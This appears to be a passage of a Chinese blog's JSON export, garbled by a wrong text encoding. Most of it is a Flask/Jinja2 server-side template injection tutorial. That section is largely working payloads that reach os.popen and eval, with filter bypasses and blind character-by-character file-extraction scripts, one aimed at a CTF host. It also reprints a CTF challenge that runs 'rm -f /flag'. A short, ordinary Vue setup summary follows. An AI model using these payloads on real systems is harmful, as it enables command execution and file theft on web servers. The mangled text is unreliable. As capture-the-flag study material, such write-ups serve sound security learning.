å‡½æ•°ä¼šä»¥å­—å…¸ç±»å‹è¿”å›å½“å‰ä½ç½®çš„å…¨éƒ¨å…¨å±€å˜é‡,åœ¨äº¤äº’æ¨¡å¼ä¸‹ï¼š 1__globals__ äºæ˜¯æˆ‘ä»¬æ‹¼æ¥å¾—åˆ°å¦‚ä¸‹çš„payload: 1config.__class__.__init__.__globals__ å¯ä»¥å¾—åˆ°ï¼š æˆ‘ä»¬ç”¨ä¸‹é¢è¿™ä¸ªæ–¹å¼æ¥è·å–osåº“ï¼Œåˆ©ç”¨__dictè¿™ä¸ªæ–¹æ³•æ¥æŸ¥çœ‹osåº“å“ªäº›å¯ä»¥ç»™æˆ‘ä»¬è¿›è¡Œä½¿ç”¨ 1.__globals__[&#x27;os&#x27;] æˆ‘ä»¬èƒ½å¤Ÿæ‰¾åˆ°systemï¼Œä½†æ˜¯æˆ‘ä»¬ç”¨è¯¥æ–¹æ³•å´æ— æ³•å¾—åˆ°å›æ˜¾ï¼Œè¯¥æ–¹æ³•åªä¸è¿‡æ˜¯æˆåŠŸçš„æ—¶å€™è¿”å›1ï¼Œå¤±è´¥äº†åˆ™æ˜¯è¿”å›0 æ‰§è¡Œå¦‚ä¸‹ï¼š 12http://localhost/?id=&#123;&#123;%20config.__class__.__init__.__globals__[&#x27;os&#x27;].system(&#x27;dir()&#x27;)&#125;&#125; å¾—åˆ°1æˆ–è€…0å¯¹äºæˆ‘ä»¬æ¥è¯´æ„ä¹‰ä¸å¤§ï¼Œå½“ç„¶è¿™æ ·ä¹Ÿå¯ä»¥è¿›è¡Œç›²æ³¨ã€ï¼Œè€Œpopenåˆ™å¯ä»¥è¿”å›æ–‡ä»¶å¯¹è±¡ os.popen è¯¥æ–¹æ³•ä¸ä½†æ‰§è¡Œå‘½ä»¤è¿˜è¿”å›æ‰§è¡Œåçš„ä¿¡æ¯å¯¹è±¡ï¼Œæ˜¯é€šè¿‡ä¸€ä¸ªç®¡é“æ–‡ä»¶å°†ç»“æœè¿”å›ã€‚ output = os.popen(â€˜cat /proc/cpuinfoâ€™) print output.read() äºæ˜¯æˆ‘ä»¬æ„é€ æœ€ç»ˆçš„payloadï¼š 1&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;dir()&#x27;).read()&#125;&#125; 1.2 configä»¥å¤–çš„æ€è·¯å…¶ä»–çš„ä¸€äº›æ€è·¯ï¼Œé¦–å…ˆï¼Œæˆ‘ä»¬çš„configè¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿé™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡()å’Œâ€™â€™åˆ†åˆ«è·å–åˆ°tupleå’Œstrçš„åˆå§‹åŒ–~ 12&#x27;&#x27;.__class__.__name__ #å¾—åˆ°str()_.__class__.__name__ #tuple è¿™æ—¶å¼•å…¥baseå’Œmroçš„é­”æœ¯æ–¹æ³• 12bases : ç±»çš„åŸºç±»çš„å…ƒç»„ï¼Œé¡ºåºä¸ºå®ƒä»¬åœ¨åŸºç±»åˆ—è¡¨ä¸­å‡ºç°çš„é¡ºåºï¼ˆåŸºç±»å°±æ˜¯Objectç±»~ï¼‰mro :ç±»çš„çˆ¶ç±»ï¼Œä»çˆ¶ç±»ç½‘ä¸Šæ‰¾ï¼Œæœ€ç»ˆä¼šæ‰¾åˆ°åŸºç±»ï¼Œæ‰€ä»¥mro[-1]ç­‰ä»·äº__bases__ è¿™æ—¶å€™æˆ‘ä»¬å°±æƒ³åˆ°çš„ï¼Œæˆ‘ä»¬æ—¢ç„¶å¾—åˆ°äº†åŸºç±»ï¼Œæ˜¯ä¸æ˜¯å°±æƒ³è¦æ‰€æœ‰çš„å­ç±»äº†å‘¢ï¼Ÿæ¯•ç«Ÿå­ç±»çš„å†…å®¹æˆ‘ä»¬æ›´åŠ æ„Ÿå…´è¶£ï¼Œæˆ‘ä»¬æœ€ç»ˆçš„ç›®æ ‡å°±æ˜¯æ‰¾åˆ°osåº“å¯¹å§ã€‚è€Œpythonæ­£å¥½æ‹¥æœ‰è¿™ä¸ªé­”æœ¯æ–¹æ³• 1__subclasses__ #è·å–æ‰€æœ‰çš„å­ç±»æ–¹æ³• ä¹‹åæ…¢æ…¢å»å¯»æ‰¾å³å¯ï¼Œè¯¥æ–‡ç« ä¸­æœ‰ï¼Œåœ¨catch_warnningsæ¨¡å—ä¸‹å«æœ‰builtinsï¼Œæˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ªå»æ‰¾evalï¼š 12&#123;&#123; [].__class__.__mro__[-1].__subclasses__()[192].__init__.__globals__. __builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;dir()&#39;).read()&quot;) &#125;&#125; 1.3æ€»ç»“åšé¢˜çš„æ€è·¯ï¼šæ€»è€Œè¨€ä¹‹ï¼Œæˆ‘ä»¬è¦ä¹ˆå»æ‰¾builtinså‡½æ•°ä¸‹çš„evalï¼Œè¦ä¹ˆå»æ‰¾osã€‚ 1str&#x3D; %EF%B9%9B%EF%B9%9Bself.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(request.args.x1).read()%EF%B9%9C%EF%B9%9C 2.è°ˆè°ˆè¿‡æ»¤åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä¼šé‡è§å„ç§å„æ ·çš„è¿‡æ»¤ï¼Œæ¯”å¦‚æˆ‘ä»¬é‡è§å¯¹configçš„è¿‡æ»¤ï¼Œä»¥åŠosè¿‡æ»¤å•Šç­‰ç­‰ 2.1 è¿‡æ»¤äº†osï¼Œsystemç­‰çš„æƒ…å†µåœ¨è¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬ä¹Ÿä¸éœ€æ…Œï¼Œå¦‚æœåªæ˜¯å¯¹ä¸­æ‹¬å·ä¸­å¯èƒ½ç”¨åˆ°çš„å†…å®¹è¿›è¡Œè¿‡æ»¤çš„è¯ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥é€šè¿‡æ‹¼æ¥ç»•è¿‡ï¼š æ¯”å¦‚æˆ‘ä»¬ä¹‹å‰çš„payloadä¿®æ”¹æˆï¼š 1?id=&#123;&#123; config.__init__.__globals__[&#x27;o&#x27;+&#x27;s&#x27;].popen(&#x27;dir&#x27;).read() &#125;&#125; 2.2 è¿‡æ»¤äº†ä¸­æ‹¬å·è¿™æ ·çš„è¯,å¯ä»¥ç”¨getitemæ–¹æ³•ï¼Œè¯¥æ–¹æ³•ç­‰ä»·äºä¸€ä¸ªè¿­ä»£å™¨çš„é€‰æ‹©ï¼Œå¼€å‘è€…çš„åŸæ„æ˜¯è®©äººä»¬å¯ä»¥ç”¨è¿™ä¸ªè¿­ä»£å¯¹è±¡,è¿™ç¯‡æ–‡ç« è®²çš„ä¸é”™ 1https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_24805141&#x2F;article&#x2F;details&#x2F;81411775 Pythonçš„é­”æ³•æ–¹æ³•__getitem__ å¯ä»¥è®©å¯¹è±¡å®ç°è¿­ä»£åŠŸèƒ½ï¼Œè¿™æ ·å°±å¯ä»¥ä½¿ç”¨for...in... æ¥è¿­ä»£è¯¥å¯¹è±¡äº†ï¼ŒåŒæ—¶ä¹Ÿå…è®¸æˆ‘ä»¬åˆ©ç”¨gettiemæ¥ç›´æ¥é€‰æ‹©å†…å®¹,æ‰€ä»¥æˆ‘ä»¬ä¹‹å‰çš„payloadï¼š 1&#123;&#123; config.__init__.__globals__.__getitem__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read() &#125;&#125; åˆ©ç”¨requestèµ·æ­¥ 1&#123;&#123; request.__class__.__mro__.__getitem__(-1).__subclasses__().__getitem__(192).__init__.__globals__.__builtins__.__getitem__(&#x27;eval&#x27;)(&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read()&quot;) &#125;&#125; 2.3 è¿‡æ»¤äº†.å·è¿™ä¸ªå¯ä»¥ä½¿ç”¨attræ¥è¿›è¡Œç»•è¿‡äº†ï¼Œç›´æ¥ç»™å‡ºç»•è¿‡æ–¹æ³•ï¼š æ‰€ä»¥ä¹‹å‰çš„payloadè¿›è¡Œå¯¹æ¯”ï¼š 12345[].__class__ = []|attr(__class__)&#123;&#123;[]|attr(&#x27;__class__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)() &#125;&#125;&#123;&#123; ([]|attr(&#x27;__class__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)())[190] &#125;&#125; 12&#123;&#123; ([]|attr(&#x27;__class__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)())[192]|attr(&#x27;__init__&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__builtins__&#x27;)|attr(__getitem__)(&#x27;eval&#x27;) &#125;&#125; # æ‹¼åˆ°è¿™é‡Œæ‹¼ä¸ä¸‹å»äº†ã€‚ã€‚è¯·é—®æœ‰äººçŸ¥é“ä¸ºä»€ä¹ˆå˜›,evalæ— è®ºå¦‚ä½•éƒ½å–ä¸åˆ°äº† ä¸çŸ¥é“ä¸ºä»€ä¹ˆåœ¨æˆ‘ä»ä¸Šå¾€ä¸‹ç»§ç»­å–å€¼çš„æ—¶å€™ï¼Œæ€ä¹ˆéƒ½æ²¡æ³•ç»§ç»­å‘ä¸‹å–å€¼äº†ã€‚ä½†æ˜¯çœ‹è§å¯ä»¥è½¬æ¢æ€è·¯ 2.5åˆ©ç”¨requestâ€‹ å› ä¸ºflaskæ­¤æ—¶èƒ½å…è®¸ç”¨æˆ·è‡ªå®šä¹‰è¾“å‡ºï¼Œåæœ‰å…«ä¹æ˜¯æœ‰requestçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å»åˆ©ç”¨è¿™ä¸ªä¹Ÿä¸æ˜¯ç›¸å½“ä¸é”™çš„ è¿™é‡Œç¿»é˜…åˆ°äº†ä¸€ä¸ªè€å¤–æ€è·¯ï¼Œä½†æ˜¯ä»–æ²¡ç»™å…¨ã€‚ 1http://localhost/?id=&#123;&#123;request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)|attr(&#x27;__base__&#x27;) &#125;&#125;&amp;class=class&amp;usc=_&amp;init=init åˆ©ç”¨requestçš„æ€è·¯å»é‡æ–°æŠŠpayloadæ‹¼å‡ºæ¥ 1?id=&#123;&#123;[][request[&#x27;args&#x27;][&#x27;class&#x27;]][request[&#x27;args&#x27;][&#x27;base&#x27;]][request[&#x27;args&#x27;][&#x27;subclasses&#x27;]]()[153][request[&#x27;args&#x27;][&#x27;dict&#x27;]][request[&#x27;args&#x27;][&#x27;init&#x27;]][request[&#x27;args&#x27;][&#x27;globals&#x27;]][request[&#x27;args&#x27;][&#x27;builtins&#x27;]][&#x27;eval&#x27;](request[&#x27;args&#x27;][&#x27;payload&#x27;])&#125;&#125;&amp;base=__base__&amp;subclasses=__subclasses__&amp;dict=__dict__&amp;init=__init__&amp;globals=__globals__&amp;builtins=__builtins__&amp;class=__class__&amp;payload=__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read() 2.4å°†ä¸­æ‹¬å·å’Œ.å·éƒ½è¿‡æ»¤æƒ…å†µä¸‹å½“ç„¶ä¸Šé¢çš„éš¾åº¦éƒ½æ˜¯ç›¸å½“ç®€å•çš„é¢˜ç›®æ‰ä¼šé‡è§äº†ï¼Œåœ¨å½“å‰ç¯å¢ƒä¸‹ï¼Œå¾€å¾€ä¼šè¿‡æ»¤çš„ç›¸å½“ä¸¥æ ¼ï¼Œæˆ‘ä»¬åº”è¯¥ä»flaskæœ¬èº«å‡ºç°çš„ç±»å¼€å§‹æ‰¾ï¼Œæ¯”å¦‚é¢˜ç›®å¯èƒ½éªŒè¯çš„æ—¶å€™ï¼Œä»…ä»…éªŒè¯æˆ‘ä»¬è¾“å…¥çš„idã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ­¤ï¼Œè®©flaskè¯»å–headerä¸­çš„å†…å®¹ï¼Œè¿™æ ·å°±å¯ä»¥æ‰“ç ´é™åˆ¶ æˆ‘ä»¬å¯ä»¥å…ˆå†™ä¸€ä¸ªè„šæœ¬ï¼š 123456789101112http://localhost/?id=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125; &#123;% for b in c.__init__.__globals__.values() %&#125; &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125; &#123;% if &#x27;eval&#x27; in b.keys() %&#125; &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;dir()&quot;).read()&#x27;) &#125;&#125; &#123;% endif %&#125; &#123;% endif %&#125; &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125; ä¹‹åä¸ºäº†ç»•è¿‡æ‹¬å·çš„é™åˆ¶ï¼Œé‡‡ç”¨è¿™ç§æ–¹æ³•ï¼š è¿™é‡Œç»™å‡ºä¸€ä¸ªpayloadï¼š 12345678910111213141516171819&#123;% for c in []|attr(request.headers.x1)|attr(request.headers.x2)|attr(request.headers.x3)() %&#125; &#123;% if c|attr(request.headers.x4)==request.headers.x5 %&#125; &#123;%for d in ((c|attr(request.headers.x6)|attr(request.headers.x7))[request.headers.x8])%&#125; &#123;%if d==request.headers.x9%&#125;&#123;&#123;((c|attr(request.headers.x6)|attr(request.headers.x7))[request.headers.x8])[d](request.headers.x13)&#125;&#125; &#123;% endif %&#125; &#123;% endfor %&#125; &#123;% endif%&#125;&#123;% endfor %&#125; x13: __import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()x9: evalx8: __builtins__x7: __globals__x6: __init__x5: catch_warningsx4: __name__x3: __subclasses__x2: __base__x1: __class__ 2.6 è¿‡æ»¤äº†å•å¼•å·å’ŒåŒå¼•å·çš„æƒ…å†µåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°±åªèƒ½å»å°è¯•æŸ¥æ‰¾å„ç±»çš„openå‡½æ•°äº†ï¼Œæ²¡æœ‰åŠæ³•æ‰§è¡Œå‘½ä»¤äº†ï¼Œäºæ˜¯æŸ¥æ‰¾åˆ°ï¼š 1self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;flag&quot;).read() ä¹‹åä¸ºäº†ç»•è¿‡å¼•å·çš„è¿‡æ»¤ï¼Œæˆ‘ä»¬å°è¯•ä½¿ç”¨request.args.x1çš„æ–¹å¼è¿›è¡Œç»•è¿‡ æ‹¼å‡‘å¾—ï¼š 2.7 è¯»å–æ–‡ä»¶1?id=&#123;&#123; self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(request.args.x1).read() &#125;&#125;&amp;x1=flag è€Œå®é™…ä¸Šï¼Œæˆ‘å‘ç°ä¸­æ‹¬å·ä¹Ÿæ˜¯å¯ä»¥è¿›è¡Œæ›¿ä»£çš„ 1&#123;&#123; [].__class__.__mro__[-1].__subclasses__()[192].__init__.__globals__. __builtins__[request.args.x1](&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read()&quot;) &#125;&#125;&amp;x1=eval æ‹¼å‡‘å¾—å‡ºï¼š 1&#123;&#123; config.__class__.__init__.__globals__[request.args.x1].popen(request.args.x2).read() &#125;&#125;&amp;x1=os&amp;x2=dir 2.8è¿‡æ»¤äº†evalï¼Œpopenï¼Œä¸¤ä¸ªå·¦èŠ±æ‹¬å·è¿™é‡Œè®°å½•ä¸€ä¸‹è‡ªå·±å­¦ä¹ åˆ°çš„ä¸€é“é¢˜ç›®ï¼š ä¸Šæµ·å¸‚ç½‘ç»œå®‰å…¨å¤§èµ›ï¼š123456789101112131415161718192021222324252627282930313233343536373839from flask import Flask,request,render_templatefrom jinja2 import Templateimport osapp = Flask(__name__)f = open(&#x27;/flag&#x27;,&#x27;r&#x27;)flag = f.read()@app.route(&#x27;/&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])def home():__ name = request.args.get(&quot;name&quot;) or &quot;&quot; print(name) if name: return render_template(&#x27;index.html&#x27;,name=name) else: return render_template(&#x27;index.html&#x27;)@app.route(&#x27;/help&#x27;,methods=[&#x27;GET&#x27;])def help(): help = &#x27;&#x27;&#x27; &#x27;&#x27;&#x27; return f.read()@app.errorhandler(404)def page_not_found(e): #No way to get flag! os.system(&#x27;rm -f /flag&#x27;) url = name = request.args.get(&quot;name&quot;) or &quot;&quot; r = request.path r = request.data.decode(&#x27;utf8&#x27;) if &#x27;eval&#x27; in r or &#x27;popen&#x27; in r or &#x27;&#123;&#123;&#x27; in r: t = Template(&quot; Not found!&quot;) return render_template(t), 404 t = Template(r + &quot; Not found!&quot;) return render_template(t), 404if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;,port=8888) è¿™é“é¢˜æ¯”è¾ƒæ–°æœ‰æ„æ€çš„ç‚¹åœ¨ä¸¤ä¸ªåœ°æ–¹ï¼š è¿‡æ»¤äº†è¿™ä¸ªåœ°æ–¹ï¼š 1if &#x27;eval&#x27; in r or &#x27;popen&#x27; in r or &#x27;&#123;&#123;&#x27; in r: è¿‡æ»¤äº†{ {} },è¿™æ ·å­çš„æƒ…å†µä»¥å‰è‡ªå·±æ²¡æœ‰é‡è¿‡ï¼Œåæ¥çŸ¥é“å¯ä»¥è¿›è¡Œç›²æ³¨ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥å°è¯•è¯»å–æ–‡ä»¶ï¼Œè¯»å–æ–‡ä»¶çš„payloadå¦‚ä¸‹ï¼š 1&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;your file name &quot;).read()[1:2] &#x3D;&#x3D; &quot;a&quot; %&#125;~p0~&#123;% endif %&#125; å¦‚æœæ»¡è¶³æ¡ä»¶ï¼Œåˆ™ä¼šè¾“å‡ºp0ï¼Œå¦åˆ™å°±ä¸ä¼šè¾“å‡ºã€‚ç¬¬äºŒç‚¹ï¼Œæˆ‘ä»¬è¯¥è¯»å–ä»€ä¹ˆæ–‡ä»¶å‘¢ï¼Ÿ è¿™é‡Œè¿ç”¨äº†os.system(â€œrm -f /flagâ€) é»˜è®¤çš„è¿›ç¨‹åˆ é™¤åä¼šå­˜æ”¾åœ¨æš‚æ—¶æ–‡ä»¶ä¸­ï¼Œè¿›ç¨‹ä¸ºï¼š 1/proc/self/fd/3 æ•…ç¼–å†™è„šæœ¬å¦‚ä¸‹ï¼š 12345678910111213141516171819202122import requestsimport stringurl = &#x27;http://eci-2ze006f3h1dkgrldoskz.cloudeci1.ichunqiu.com:8888/a&#x27;headers=&#123; &#x27;Content-Type&#x27;:&#x27;application/json&#x27;&#125;def check(payload): r = requests.post(url, data=payload,headers=headers).text return &#x27;~p0~&#x27; in rpassword = &#x27;&#x27;sa=string.printable#print(s)for i in range(0,100): for c in sa: payload=&#x27;&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;/proc/self/fd/3&quot;).read()[&#x27; + str(i) + &#x27;:&#x27; + str( i + 1) + &#x27;] == &quot;&#x27; + c + &#x27;&quot; %&#125;~p0~&#123;% endif %&#125;&#x27; # print(payload) if check(payload): password += c break print(password) è„šæœ¬ï¼š 123456789101112131415161718import requests,stringurl = &quot;http://localhost:8080&quot;list = string.ascii_letters + string.digits+ &quot;-/_&#123;&#125;&quot;flag = &quot;&quot;for i in range(999): for j in list: payload = &#x27;&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;flag&quot;).read()[&#x27;+str(i)+&quot;:&quot;+str(i+1)+&#x27;] == &quot;&#x27;+j+&#x27;&quot; %&#125;~p0~&#123;% endif %&#125;&#x27; # print(payload) data =&#123;&quot;id&quot;:payload&#125; res = requests.get(url,params=data).text # print(res) if &quot;~p0~&quot; in res: i+=1 flag+=j print(&quot;flag:&quot; + flag) break 2.8è¿‡æ»¤äº†ç©ºæ ¼ï¼ŒrequestspayloadåŸºæœ¬æ²¡æœ‰å˜åŠ¨ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹è¿˜è¢«æ¶å¿ƒäº†ä¸€ä¸‹requestï¼Œæ‰€ä»¥æˆ‘ä»¬åº”è¯¥è¿™æ ·ç”¨ï¼š åŸæœ¬æ­£å¸¸çš„payload 1?id&#x3D;&#123;&#123; self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(request.args.x1).read() &#125;&#125;&amp;x1&#x3D;flag æ”¹é€ åï¼š 1?id&#x3D;&#123;&#123; self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;cat\\x20&#x2F;flag&quot;).read() &#125;&#125;","categories":[],"tags":[{"name":"ssti","slug":"ssti","permalink":"http://example.com/tags/ssti/"}]},{"title":"Vueæ€»ç»“","slug":"Vueæ€»ç»“","date":"2020-10-25T13:28:49.000Z","updated":"2020-11-17T06:08:39.740Z","comments":true,"path":"2020/10/25/Vueæ€»ç»“/","link":"","permalink":"http://example.com/2020/10/25/Vue%E6%80%BB%E7%BB%93/","excerpt":"Vue partæ€»ç»“äº†å‰ç«¯é¡¹ç›®çš„æ­å»ºï¼Œä»¥åŠè‡ªå·±åœ¨è¿™æ¬¡ä½œå“ä¸­å­¦åˆ°äº†ä»€ä¹ˆ","text":"Vue partæ€»ç»“äº†å‰ç«¯é¡¹ç›®çš„æ­å»ºï¼Œä»¥åŠè‡ªå·±åœ¨è¿™æ¬¡ä½œå“ä¸­å­¦åˆ°äº†ä»€ä¹ˆ Vueæˆ‘è®¤ä¸ºå­¦ä¸‹æ¥å°±æ˜¯å¾ˆçˆ½ï¼ŒåŸºæœ¬ä¸Šä¸ç”¨å†å„ç§å»ç»‘å®šJSå½“ä¸­çš„domå…ƒç´ äº†ï¼ˆgetElementByIdä»€ä¹ˆçš„ï¼‰ å…¶ä¸­åŸºç¡€æºç ï¼Œæœ‰ä¸€ä¸ªindex.html 1.index.html123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1.0&quot;&gt; &lt;link rel=&quot;icon&quot; href=&quot;&lt;%= BASE_URL %&gt;favicon.ico&quot;&gt; &lt;title&gt;&lt;%= htmlWebpackPlugin.options.title %&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;noscript&gt; &lt;strong&gt;We&#x27;re sorry but &lt;%= htmlWebpackPlugin.options.title %&gt; doesn&#x27;t work properly without JavaScript enabled. Please enable it to continue.&lt;/strong&gt; &lt;/noscript&gt; &lt;div id=&quot;app&quot;&gt;&lt;/div&gt; &lt;!-- built files will be auto injected --&gt; &lt;/body&gt;&lt;/html&gt; å¯åŠ¨çš„æ—¶å€™æœ‰ä¸€ä¸ªmain.jsï¼ŒAPP.vueç­‰ç­‰ã€‚ç°åœ¨è®²ä¸€ä¸‹æˆ‘æ˜¯æ€ä¹ˆåšä¸‹æ¥çš„ï¼Œæˆ‘åˆ©ç”¨åˆ°çš„æ¡†æ¶æ˜¯antdvï¼Œå†package.jsonå½“ä¸­å¯ä»¥æ‰¾åˆ° 2.package.json1234567891011121314151617181920212223242526272829303132&quot;dependencies&quot;: &#123; &quot;@antv/data-set&quot;: &quot;^0.11.7&quot;, &quot;@antv/g2&quot;: &quot;^4.0.15&quot;, &quot;@sven0706/websocket&quot;: &quot;^1.0.1&quot;, &quot;ant-design-vue&quot;: &quot;^1.6.5&quot;, &quot;axios&quot;: &quot;^0.20.0&quot;, &quot;core-js&quot;: &quot;^3.6.5&quot;, &quot;echarts&quot;: &quot;^4.9.0&quot;, &quot;html2canvas&quot;: &quot;^1.0.0-rc.7&quot;, &quot;js-cookie&quot;: &quot;^2.2.1&quot;, &quot;jspdf&quot;: &quot;^2.1.1&quot;, &quot;less&quot;: &quot;^3.12.2&quot;, &quot;less-loader&quot;: &quot;^7.0.1&quot;, &quot;rc-resize-observer&quot;: &quot;^0.2.5&quot;, &quot;react&quot;: &quot;^16.13.1&quot;, &quot;react-dom&quot;: &quot;^16.13.1&quot;, &quot;react-window&quot;: &quot;^1.8.5&quot;, &quot;vant&quot;: &quot;^2.10.9&quot;, &quot;vue&quot;: &quot;^2.6.11&quot;, &quot;vue-print-nb&quot;: &quot;^1.5.0&quot;, &quot;vue-router&quot;: &quot;^3.4.5&quot;, &quot;vuex&quot;: &quot;^3.5.1&quot; &#125;, &quot;devDependencies&quot;: &#123; &quot;@vue/cli-plugin-babel&quot;: &quot;~4.5.0&quot;, &quot;@vue/cli-plugin-eslint&quot;: &quot;~4.5.0&quot;, &quot;@vue/cli-service&quot;: &quot;~4.5.0&quot;, &quot;babel-eslint&quot;: &quot;^10.1.0&quot;, &quot;eslint&quot;: &quot;^6.7.2&quot;, &quot;eslint-plugin-vue&quot;: &quot;^6.2.2&quot;, &quot;vue-template-compiler&quot;: &quot;^2.6.11&quot; &#125;, è¦ç”¨çš„æ—¶å€™å†é¡¹ç›®æ ¹ç›®å½•ä¸‹cnpm -iå³å¯ã€‚ è®²ä¸€ä¸‹è·¯ç”±è¯¥æ€ä¹ˆåšæŠŠï¼Œé¦–å…ˆåˆ›å»ºä¸€ä¸ª 3.router.js1234//å¼•å…¥vueimport Vue from &#x27;vue&#x27;;//å¼•å…¥vue-routerimport VueRouter from &#x27;vue-router&#x27;; åœ¨Vueå½“ä¸­ï¼Œæ‰€æœ‰éœ€è¦å¼•ç”¨çš„ä¸œè¥¿éœ€è¦ç”¨Vue.useä¹‹åæ‰ä¼šç”Ÿæ•ˆ æ•…æˆ‘ä»¬æ„é€ ä¹‹åçš„ä»£ç æ¡†æ¶å¤§è‡´å¦‚ä¸‹ï¼š 1234567891011121314151617//å¼•å…¥vueimport Vue from &#x27;vue&#x27;;//å¼•å…¥vue-routerimport VueRouter from &#x27;vue-router&#x27;;Vue.use(VueRouter)//å¼•ç”¨page1é¡µé¢import upload from &#x27;./components/upload.vue&#x27;;import login from &#x27;./components/login.vue&#x27;;//å®šä¹‰routesè·¯ç”±çš„é›†åˆï¼Œæ•°ç»„ç±»å‹const routes=[ //å•ä¸ªè·¯ç”±å‡ä¸ºå¯¹è±¡ç±»å‹ï¼Œpathä»£è¡¨çš„æ˜¯è·¯å¾„ï¼Œcomponentä»£è¡¨ç»„ä»¶ &#123;path:&#x27;/upload&#x27;,component:upload&#125;, &#123;path:&#x27;/login&#x27;,component:login&#125;, ä¸€ä¸ªVueæ–‡ä»¶çš„æ ¼å¼å¦‚ä¸‹ï¼š 4.ä¸»å…¥å£123456789101112131415161718&lt;template&gt; &lt;div id&#x3D;&quot;app&quot;&gt; &lt;router-view&#x2F;&gt; &lt;&#x2F;div&gt;&lt;&#x2F;template&gt;&lt;script&gt;export default &#123; name: &#39;App&#39;, &#125;&lt;&#x2F;script&gt;&lt;style&gt;&lt;&#x2F;style&gt; åœ¨templateå½“ä¸­æ„é€ HTMLçš„ä»£ç ï¼Œscriptå½“ä¸­æ„é€ å½“å‰é¡µé¢çš„JSï¼Œè€Œstyleè®¾ç½®ä¸­å†™cssã€‚å¦‚æœä¸åšé™å®šï¼ŒCSSå°†ä¼šæ˜¯å…¨å±€ç”Ÿæ•ˆçš„ï¼ è€ŒAPPä½œä¸ºä¸»é¡µé¢ï¼Œåªéœ€è¦å†™ä¸€å¥è¯å³å¯ï¼š 1&lt;router-view/&gt; è¿™ä¸€å¥è¯çš„æ„æ€ä»£ç å°†é¡µé¢å†…å®¹æ‰˜ç®¡ç»™Vueï¼Œæ ¹æ®vueçš„Routeræ¥æ˜¾ç¤ºå†…å®¹ è€ŒRouterçš„è®¾ç½®åœ¨main.jså½“ä¸­ï¼ˆå®é™…ä¸Šï¼Œå‡ ä¹æ‰€æœ‰çš„è®¾ç½®éƒ½æ”¾åœ¨main.jså½“ä¸­è¿›è¡Œç»Ÿä¸€è®¾ç½®ï¼‰ 1234new Vue(&#123; router, render: h =&gt; h(App),&#125;).$mount(&#x27;#app&#x27;) åœ¨main.jså¯¼å…¥çš„æ¨¡å—å¯ä»¥å…¨é¡¹ç›®ç”Ÿæ•ˆï¼Œå¦‚æœæƒ³è¦æ™®é€šçš„ç”Ÿæ•ˆä¸€ä¸ªæ¨¡å—ï¼Œè¿™æ ·æ„é€ ï¼š 123456789101112import &#123; Button, Table, Menu, Switch,Icon,Layout,Upload,Breadcrumb,FormModel,Input,Divider,message,Form,Alert,Spin,Modal &#125; from &#x27;ant-design-vue&#x27;//åœ¨ä¸‹é¢ï¼šVue.use(Modal)Vue.use(Spin)Vue.use(Alert)Vue.use(Form)Vue.use(axios)Vue.use(htmlToPdf)Vue.use(Divider)Vue.use(Input)Vue.use(FormModel) å¦‚æœæƒ³è¦ä¿®æ”¹Vueé»˜è®¤çš„è®¾ç½®ï¼Œä¾‹å¦‚æˆ‘ä»¬å¯¼å…¥axiosçš„æ—¶å€™è¿™æ ·æ„é€ ï¼š 12import axios from &#x27;axios&#x27;Vue.prototype.$http = axios ä¹‹åæˆ‘æ„é€ äº†ä¸€ä¸ªå…¬å…±ä½¿ç”¨çš„Vueæ¨¡æ¿ï¼Œä¹Ÿå°±æ˜¯èœå•æ çš„æ’ä»¶ï¼Œæˆ‘æ˜¯åˆ›å»ºäº†ä¸€ä¸ªcommonsæ–‡ä»¶å¤¹ï¼Œå¹¶å†™åœ¨é‡Œé¢ 